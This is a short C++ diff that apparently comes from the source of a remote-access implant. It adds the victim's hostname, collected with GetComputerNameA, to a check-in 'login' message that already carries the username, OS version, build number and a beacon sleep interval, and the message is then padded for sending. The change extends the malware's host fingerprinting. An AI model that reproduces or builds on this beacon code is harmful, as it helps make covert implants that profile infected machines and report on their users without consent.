@@ -512,13 +512,18 @@ int main()
         osver = osInfo.dwMajorVersion;
         build_num = osInfo.dwBuildNumber;
     }
+    // Get the user
     char username[1024];
     DWORD username_len = 1024;
     GetUserNameA(username, &username_len);
+    // Get the hostname
+    char hostname[1024];
+    DWORD hostname_len = 1024;
+    GetComputerNameA(hostname, &hostname_len);
 
     // Converting OS info to str
     char login_fmt[1024];
-    sprintf(login_fmt, "%d:::%d:::%d:::%s", osver, build_num, sleep_time, username);
+    sprintf(login_fmt, "%d:::%d:::%d:::%s\\%s", osver, build_num, sleep_time, hostname, username);
 
     //...now need to pad 16 bytes
     std::string login_msg = FUCKUP_PAD;
